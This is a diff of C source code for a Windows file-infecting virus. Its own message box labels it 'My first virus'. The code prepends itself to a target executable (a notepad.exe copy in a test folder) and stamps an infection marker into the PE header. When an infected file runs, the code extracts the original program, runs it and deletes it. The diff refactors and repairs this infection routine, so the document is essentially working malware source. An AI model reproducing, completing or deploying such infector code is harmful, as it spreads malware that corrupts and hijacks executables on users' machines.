@@ -121,66 +121,67 @@ int main(int argc, char *argv[])
 	//Patient
 	char chStr[38] = "C:\\virrr\\notepad.exe";
 	wchar_t b[MAX_PATH];
-	
-	//HANDLE hFind = FindFirstFile(CharToWchar(chStr), &FindFileData);
 	long w;
 	GetAPIs();
-	HANDLE hfPat;
-	HANDLE hMap;
+	HANDLE hfPat, hMap;
 	BYTE* hMapAddress;
+	DWORD atrFile, atrMap, atrAddr;
 
 	get_module_file_name(NULL, b, MAX_PATH);
 	printf("Name of file: %s\n", WcharToChar(b));
-	if(!strcmp(WcharToChar(b), chStr)){
-										hfPat = create_file(CharToWchar(chStr), 0x80000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-										if((DWORD)hfPat == 0xffffffff) {printf("1:Open patient file error!"); getch();close_handle(hfPat); return 0; }
-										w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
-										hMap = create_file_mapping(hfPat, NULL, 0x02, 0, w, NULL); //PAGE_READWRITE 0x04
-										if(hMap==NULL) {printf("1:error - hMap"); getch();close_handle(hfPat); return 0; }
-										hMapAddress = (BYTE*) map_view_of_file(hMap, 0x04, 0, 0, w);
-										if(!hMapAddress) {printf("1:error - hMapAddress");getch();return 0;}
-
-								}
-	else {
-		hfPat = create_file(CharToWchar(chStr), 0xC0000000, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
-		if((DWORD)hfPat == 0xffffffff) {printf("2:Open patient file error!");getch(); close_handle(hfPat); return 0; }
-		w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
-		hMap = create_file_mapping(hfPat, NULL, 0x04, 0, w, NULL); //PAGE_READWRITE 0x04
-		if(hMap==NULL) {printf("2:error - hMap"); getch();close_handle(hfPat); return 0; }
-		hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
-		if(!hMapAddress) {printf("2:error - hMapAddress");getch();return 0;}
-
+	if(!strcmp(WcharToChar(b), chStr))
+	{
+		atrFile = 0x80000000;
+		atrMap = 0x02;
+		atrAddr = 0x04;
 	}
+	else 
+	{
+		atrFile = 0xC0000000;
+		atrMap = 0x04;
+		atrAddr = 0x02;
+	}
+	hfPat = create_file(CharToWchar(chStr), atrFile, 0x00000001, NULL, 3, 0x00000080, 0); //FILE_SHARE_READ 0x00000001 OPEN_EXISTING 3  FILE_ATTRIBUTE_NORMAL 0x00000080
+	if((DWORD)hfPat == 0xffffffff) {printf("Open patient file error!"); getch();close_handle(hfPat); return 0; }
+	w = set_file_pointer(hfPat, 0,0, 2); //FILE_END 2
+	hMap = create_file_mapping(hfPat, NULL, atrMap, 0, w, NULL); //PAGE_READWRITE 0x04
+	if(hMap==NULL) {printf("error - hMap"); getch();close_handle(hfPat); return 0; }
+	hMapAddress = (BYTE*) map_view_of_file(hMap, atrAddr, 0, 0, w);
+	if(!hMapAddress) {printf("error - hMapAddress");getch();return 0;}
 	
 	BYTE* hPE = (BYTE*)NTSIGNATURE(hMapAddress);
 
-	DWORD vir_sz = 0xa200;
+	DWORD vir_sz = 0;
 
 	// Infection
-	if(*((DWORD*)(hPE + 0x4C)) == 0xa200) {
+	if(*((DWORD*)(hPE + 0x4C)) == 0x4567) {
 												MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);
-												DWORD r = 4;
+												DWORD r = 0;
 												char chStr2[38] = "c:\\virrr\\notepad2.exe";
-												//set_file_pointer(hfPat, r, 0, 2); 
-												//unsigned char vv[5];
-												//read_file(hfPat,&vir_sz, r, &r, NULL);
+
+												set_file_pointer(hfPat, -sizeof(vir_sz), 0, 2);
+												if(!read_file(hfPat, &vir_sz, sizeof(vir_sz), &r, NULL)) printf("error read vir_sz");
+												
 												set_file_pointer(hfPat, vir_sz, 0, 0);
 												HANDLE hfPat2 = create_file(CharToWchar(chStr2), 0xC0000000, 0x00000001, NULL, 2, 0x00000080, 0);
 												if((DWORD)hfPat2 == 0xffffffff) {/*printf("Open vir file error!");*/ close_handle(hfPat2); return 0; }
 												DWORD w1;
-												getch();
 												unsigned char buf[1024];
 												while(1)
 												{
 													read_file(hfPat,buf, 1024, &w1, NULL);
 													write_file(hfPat2, buf, w1, &w1, NULL);
 													if(w1 < 1024) break;
-												};
+												};											
 												close_handle(hfPat2);
 												STARTUPINFO si;
 												PROCESS_INFORMATION pi;
 												GetStartupInfo(&si);
 												if(!CreateProcess(CharToWchar(chStr2),NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi))return 0;
+												HANDLE proc = pi.hProcess;
+												WaitForSingleObject(proc, INFINITE);
+												DeleteFile(CharToWchar(chStr2));
+
 	}
 	else
 	{
@@ -192,7 +193,6 @@ int main(int argc, char *argv[])
 	
 	vir_sz = set_file_pointer(hfVir, 0, 0, 2); //FILE_END 2
 	// vnedrenie
-
 	
 		set_file_pointer(hfPat, 0, 0, 0); //FILE_BEGIN 0
 		set_file_pointer(hfVir, 0, 0, 0);
@@ -203,15 +203,11 @@ int main(int argc, char *argv[])
 		while(1)
 		{
 			read_file(hfPat,&bufPat[i], 1024, &wr, NULL);
-			//write_file(hfPat1, &buf[i], wr, &wr, NULL);
 			i+=wr;
 			if(wr < 1024) break;
 		};
-		
 
 		set_file_pointer(hfPat, 0, 0, 0);
-		//close_handle(hfPat);
-
 
 		while(1)
 		{
@@ -220,11 +216,9 @@ int main(int argc, char *argv[])
 			if(wr < 1024) break;
 		};
 		write_file(hfPat, bufPat, i, &i, NULL);
-		unsigned char nn[] = "\x01 \x03 \x05";
 		wr = 0;
-		write_file(hfPat, &vir_sz, sizeof(nn), &wr, NULL);
+		write_file(hfPat, &vir_sz, sizeof(vir_sz), &wr, NULL);
 		
-		//*((WORD*)(hPE + 0x4E)) = vir_sz;
 		close_handle(hfVir);
 		unmap_view_of_file(hMapAddress);
 		close_handle(hMap);
@@ -237,20 +231,14 @@ int main(int argc, char *argv[])
 		hMapAddress = (BYTE*) map_view_of_file(hMap, 0x02, 0, 0, w);
 		if(!hMapAddress) {/*printf("error - hMapAddress")*/;return 0;}
 		hPE = (BYTE*)NTSIGNATURE(hMapAddress);
-		*((DWORD*)(hPE + 0x4C)) = 0xa200;
+		*((DWORD*)(hPE + 0x4C)) = 0x4567;
 		unmap_view_of_file(hMapAddress);
 		close_handle(hMap);
 		close_handle(hfPat);
 	}
 	
-	//*((DWORD*)(hPE + 0x34 + ptrEndLS)) = ptrEndLS;
-	
-
-	
 	//if (!FindFiles()) return 0;
-	//getch();
 	return 1;	
-
 }
 
 wchar_t* CharToWchar(char *temp)
